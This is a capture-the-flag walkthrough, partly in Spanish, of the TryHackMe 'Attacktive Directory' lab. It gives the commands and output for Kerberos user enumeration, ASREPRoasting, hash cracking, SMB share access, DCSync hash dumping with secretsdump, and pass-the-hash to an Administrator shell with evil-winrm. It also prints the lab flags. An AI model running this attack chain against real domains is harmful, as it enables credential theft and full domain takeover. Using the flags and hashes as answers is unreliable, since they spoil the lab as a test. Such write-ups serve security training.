Installing Impacket:

Whether you're on the Kali 2019.3 or Kali 2021.1, Impacket can be a pain to install  correctly. Here's some instructions that may help you install it correctly!

Note: All of the tools mentioned in this task are installed on the AttackBox already. These steps are only required if you are setting up on your own VM. Impacket may also need you to use a python version >=3.7. In the AttackBox you can do this by running your command with python3.9 <your command>.

First, you will need to clone the Impacket Github repo onto your box. The following command will clone Impacket into /opt/impacket:

git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket

After the repo is cloned, you will notice several install related files, requirements.txt, and setup.py. A commonly skipped file during the installation is setup.py, this actually installs Impacket onto your system so you can use it and not have to worry about any dependencies.

To install the Python requirements for Impacket:

pip3 install -r /opt/impacket/requirements.txt

Once the requirements have finished installing, we can then run the python setup install script:

cd /opt/impacket/ && python3 ./setup.py install

After that, Impacket should be correctly installed now and it should be ready to use!



If you are still having issues, you can try the following script and see if this works:

sudo git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
sudo pip3 install -r /opt/impacket/requirements.txt
cd /opt/impacket/ 
sudo pip3 install .
sudo python3 setup.py install
Credit for proper Impacket install instructions goes to Dragonar#0923 in the THM Discord <3




https://discord.com/invite/tryhackme








Installing Bloodhound and Neo4j

Bloodhound is another tool that we'll be utilizing while attacking Attacktive Directory. We'll cover specifcs of the tool later, but for now, we need to install two packages with Apt, those being bloodhound and neo4j. You can install it with the following command:

apt install bloodhound neo4j

 Now that it's done, you're ready to go!


wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz

tar -xvzf bloodhound-cli-linux-amd64.tar.gz

./bloodhound-cli install






Troubleshooting

If you are having issues installing Bloodhound and Neo4j, try issuing the following command:

apt update && apt upgrade

If you are having issues with Impacket, reach out to the TryHackMe Discord for help!

Answer the questions below
Install Impacket, Bloodhound and Neo4j








wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
└─$ wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt



## ENUMERAR USUARIOS USANDO KERBRUTE





└─$ kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt         

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/13/25 - Ronnie Flathers @ropnop

2025/08/13 11:17:48 >  Using KDC(s):
2025/08/13 11:17:48 >   spookysec.local:88

james
svc-admin
James
robin
darkstar
administrator
backup
paradox
JAMES
Robin







kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt 






#  Abusing Kerberos
Introduction

After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called ASREPRoasting. ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

Retrieving Kerberos Tickets

Impacket has a tool called "GetNPUsers.py" (located in impacket/examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that's necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.

Remember:  Impacket may also need you to use a python version >=3.7. In the AttackBox you can do this by running your command with python3.9 /opt/impacket/examples/GetNPUsers.py.









## Introducción

Una vez finalizada la enumeración de cuentas de usuario, podemos intentar abusar de una función de Kerberos con un método de ataque llamado **ASREPRoasting**. 
- ASReproasting se produce cuando una cuenta de usuario tiene el privilegio "No requiere autenticación previa". Esto significa que la cuenta no necesita proporcionar una identificación válida antes de solicitar un ticket Kerberos para la cuenta de usuario especificada.





## Impacket cuenta con una herramienta llamada "GetNPUsers.py" (ubicada en impacket/examples/GetNPUsers.py) que nos permite consultar cuentas ASReproastables desde el Centro de Distribución de Claves. Lo único necesario para consultar las cuentas es un conjunto válido de nombres de usuario que enumeramos previamente mediante Kerbrute.


┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ 



impacket-GetNPUsers

python3  GetNPUsers.py -usersfile /home/kali/Downloads/kerberos/userK.txt -no-pass CONTROLLER.local/




james
svc-admin
James
robin
darkstar
administrator
backup
paradox
JAMES
Robin
Administrator


GetNPUsers.py -dc-ip <Target_IP> <Target_Domain>/ -no-pass -usersfile <the_selected_users_list>



impacket-GetNPUsers -usersfile uservalid.txt -no-pass spookysec.local/ 





[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:7e3de9d9e0eae03c5a0e7781393b3e77$f68e8a387a4ae3ffabf3c109337db46c7a7e33451ca566aef7498b47b984d21c8dfe106f397197a17a2dc1ae9a2ba3699c1f864d7a16213e145419bb3f7a50d6306b5563b579f540432f8755dfb99c1754d1c1a1c7c534635002018771c57f06a9b08d189a18e0ab75100c425046243cbe6ec215b643bcf92c95aeaf0a79a7a3e3e29bf577699561f499897452e5f3125db082027a4d7af563f986e68dc4e86d60463cb6982522c88c1e8c1b5aec6c6e3466f0abd711a2df889e1e4babd7c65397ab3ecf3be4a554bf12454098f675127babc7f0b5a21ecca253479a4640ff5394390bfd8177646da8e8c720c14b724e2973
[-] User James doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User JAMES doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set








https://hashcat.net/wiki/doku.php?id=example_hashes



18200	Kerberos 5, etype 23, AS-REP	$krb5asrep$23$user@domain.com:3e156ada591263b8aab0965f5aebd837$007497cb51b6c8116d6407a782ea0e1c5402b17db7afa6b05a6d30ed164a9933c754d720e279c6c573679bd27128fe77e5fea1f72334c1193c8ff0b370fadc6368bf2d49bbfdba4c5dccab95e8c8ebfdc75f438a0797dbfb2f8a1a5f4c423f9bfc1fea483342a11bd56a216f4d5158ccc4b224b52894fadfba3957dfe4b6b8f5f9f9fe422811a314768673e0c924340b8ccb84775ce9defaa3baa0910b676ad0036d13032b0dd94e3b13903cc738a7b6d00b0b3c210d1f972a6c7cae9bd3c959acf7565be528fc179118f28c679f6deeee1456f0781eb8154e18e49cb27b64bf74cd7112a0ebae2102ac





## Crack the hash with the modified password list provided, what is the user accounts password?



hashcat -m 18200 hash.txt passwordlist.txt 


hashcat -m 18200 hash.txt passwordlist.txt --show


$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:7e3de9d9e0eae03c5a0e7781393b3e77$f68e8a387a4ae3ffabf3c109337db46c7a7e33451ca566aef7498b47b984d21c8dfe106f397197a17a2dc1ae9a2ba3699c1f864d7a16213e145419bb3f7a50d6306b5563b579f540432f8755dfb99c1754d1c1a1c7c534635002018771c57f06a9b08d189a18e0ab75100c425046243cbe6ec215b643bcf92c95aeaf0a79a7a3e3e29bf577699561f499897452e5f3125db082027a4d7af563f986e68dc4e86d60463cb6982522c88c1e8c1b5aec6c6e3466f0abd711a2df889e1e4babd7c65397ab3ecf3be4a554bf12454098f675127babc7f0b5a21ecca253479a4640ff5394390bfd8177646da8e8c720c14b724e2973:management2005








 Back to the Basics
Enumeration:

With a user's account credentials we now have significantly more access within the domain. We can now attempt to enumerate any shares that the domain controller may be giving out.


smbclient -L \\\\10.201.73.14 -U 'svc-admin%management2005'


smbclient -L \\\\10.201.73.14 -U 'svc-admin'



Password for [WORKGROUP\svc-admin]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.201.73.14 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                       
┌──(kali㉿kali)-[~/Downloads/active]
└─$ 





smbclient \\\\$target\\backup -U svc-admin%management2005




## PODEMOS IR A LA CARPETA DE KALI E IR A ESTA RUTA

smb://10.201.73.14/backup/

**Agregar el usuario y clave svc-admin%management2005  .**

se nos abre la ruta con el archivo   backup_credentials.txt

y su clave

**YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw**


El archivo backup_credentials.txt contiene una cadena codificada en base64:


┌──(kali㉿kali)-[~/Downloads/active]
└─$ base64 -d backupactive.txt

backup@spookysec.local:backup2517860      






# Elevando privilegios dentro del dominio
¡Sincronicemos!


##  Impacket llamada "secretsdump.py". 
- Esta nos permitirá recuperar todos los hashes de contraseña que ofrece esta cuenta de usuario (que está sincronizada con el controlador de dominio). Al aprovechar esto, tendremos control total sobre el dominio de AD.



- python3 examples/secretsdump.py spookysec.local/backup:backup2517860@$target

- secretsdump.py -just-dc backup@10.10.84.206

- impacket-secretsdump -just-dc backup@10.201.73.14   

- impacket-secretsdump -just-dc spookysec.local/backup:backup2517860@10.201.73.14



impacket-secretsdump -just-dc backup@10.201.73.14          
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::




### Pasar el Hash

Un ataque de Pasar el Hash (PTH) es una técnica en la que un atacante utiliza una contraseña con hash (específicamente, un hash NTLM) en lugar de la contraseña en texto plano para autenticarse en un sistema o servicio. El objetivo es evitar la necesidad de conocer la contraseña real utilizando directamente el valor del hash para suplantar la identidad del usuario legítimo.

Usando una herramienta llamada Evil-WinRM, ¿qué opción nos permitirá usar un hash?


### Evil WinRM
Podemos usar muchas herramientas para pasar el hash. Probemos Evil WinRM:

evil-winrm -H 0e0363213e37b94221497260b0bcb4fc -i 10.201.73.14 -u Administrator




┌──(kali㉿kali)-[~/Downloads/active]
└─$ evil-winrm -H 0e0363213e37b94221497260b0bcb4fc -i 10.201.73.14 -u Administrator
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 







*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  11:39 AM             32 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
TryHackMe{4ctiveD1rectoryM4st3r}
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 






*Evil-WinRM* PS C:\Users\backup\Desktop> type PrivEsc.txt
TryHackMe{B4ckM3UpSc0tty!}




*Evil-WinRM* PS C:\Users\svc-admin\Desktop> type user.txt.txt
TryHackMe{K3rb3r0s_Pr3_4uth}
*Evil-WinRM* PS C:\Users\svc-admin\Desktop> 








https://medium.com/@mickaelbenlolo/exploiting-the-weak-links-a-step-by-step-guide-to-attacking-a-vulnerable-active-directory-62a8c8b55770



https://medium.com/@fehzanvayani/oscp-tryhackme-attacktive-directory-e7039d34023d